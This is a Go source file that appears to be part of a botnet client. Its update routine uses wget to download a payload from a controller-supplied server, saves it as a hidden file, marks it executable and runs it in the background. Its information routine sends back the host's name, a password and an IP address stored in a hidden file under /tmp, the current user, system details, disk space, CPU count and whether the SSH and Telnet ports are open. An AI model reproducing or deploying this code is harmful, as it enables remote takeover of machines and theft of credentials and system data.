package lib

import (
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"strconv"
	"syscall"
	"time"

	"golang.org/x/sys/unix"
)

func Kill() { syscall.Exit(0) }

func genName(alphabet rune) string {
	return string(alphabet + rune(rand.Intn(26)))
}

func convInt(str string) int {
	conv, _ := strconv.Atoi(fmt.Sprint(str))
	return conv
}

func getHostname() string {
	hostName, err := os.Hostname()
	if err != nil {
		return "Failed to get hostname!!!"
	}
	return hostName
}

func execComd(comd string, args ...string) string {
	fmtComd, err := exec.Command(comd, args...).Output()
	if err != nil {
		return "Failed to execute command!!!"
	}
	return string(fmtComd)
}

func getDiskSpace() string {
	wd, err := os.Getwd()
	if err != nil {
		return "Failed to get free disk space!!!"
	}
	var stat unix.Statfs_t
	unix.Statfs(wd, &stat)
	return fmt.Sprint(stat.Bavail * uint64(stat.Bsize) / 1024 / 1024 / 1024)
}

func (b *Bot) Update() {
	if setCall, setKey := SetupCaller(); setKey {
		defer Kill()
		b.Report("START UPDATING...")
		newPayload := "." + setCall.CallBot.newPayload
		execComd("wget", "-O", newPayload, setCall.CallBot.pServer)
		execComd("chmod", "700", newPayload)
		go execComd("./"+newPayload, "&")
		time.Sleep(10 * time.Second) //Wait for bot to join the server.
	}
}

func (b Bot) printPort(port string) string {
	b.timeout = 300 * time.Millisecond
	if b.checkPort("127.0.0.1:"+port) != "" {
		return "OPEN"
	}
	return "CLOSE"
}

func (b Bot) threadsNumber() string {
	return strconv.Itoa(b.CPU * 2)
}

func (b *Bot) Information() {
	if _, setKey := SetupCaller(); setKey {
		b.Report("Host Name: " + getHostname())
		b.Report("Password: " + execComd("head", "-1", "/tmp/.ffff"))
		b.Report("Current Permission: " + execComd("whoami"))
		b.Report("System: " + execComd("uname", "-a"))
		b.Report("Free Disk Space (GB): " + getDiskSpace())
		b.Report("Number of Cores: " + strconv.Itoa(b.CPU))
		b.Report("Number of Threads: " + b.threadsNumber())
		b.Report("IP Address: " + execComd("tail", "-1", "/tmp/.ffff"))
		b.Report("Default SSH: " + b.printPort("22"))
		b.Report("Default Telnet: " + b.printPort("23"))
	}
}
